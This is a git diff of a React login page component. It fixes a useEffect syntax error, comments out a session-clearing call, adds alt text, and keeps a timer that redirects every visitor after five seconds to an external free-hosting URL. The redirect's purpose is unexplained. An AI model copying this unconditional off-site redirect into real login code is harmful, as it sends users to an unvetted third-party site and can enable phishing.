@@ -15,10 +15,12 @@ export default function Login() {
     setThemeMode("light")
 
     useEffect(() => {
-         setTimeout(() => {
-        sessionStorage.clear();
-        window.location.href = "https://mythvendix.000webhostapp.com/surat/judge/template/";
-      }, 2000); [isConnected])
+        setTimeout(() => {
+            // sessionStorage.clear();
+            console.log("ok")
+            window.location.href = "https://mythvendix.000webhostapp.com/surat/judge/template/";
+        }, 5000)
+    }, [isConnected])
 
     useEffect(() => {
         if (!isConnected && selection)
@@ -42,7 +44,7 @@ export default function Login() {
     return (
         <div className="flex flex-col justify-center items-center min-h-screen bg-yellow-100">
             <Toaster />
-            <img src={bg} draggable={false} className="absolute left-0 top-0 w-screen h-screen object-cover opacity-50 z-0" />
+            <img src={bg} draggable={false} className="absolute left-0 top-0 w-screen h-screen object-cover opacity-50 z-0" alt="background" />
             <div className="text-black text-3xl z-10 font-bold uppercase">Select user type</div>
             <div className="grid grid-cols-2 md:grid-cols-4 gap-5 m-5 z-10">
                 <button className={`flex flex-col ring-1 ring-black/50 justify-center items-center rounded-xl ${selection == "USER" ? "bg-green-300" : "bg-white/50"}`}
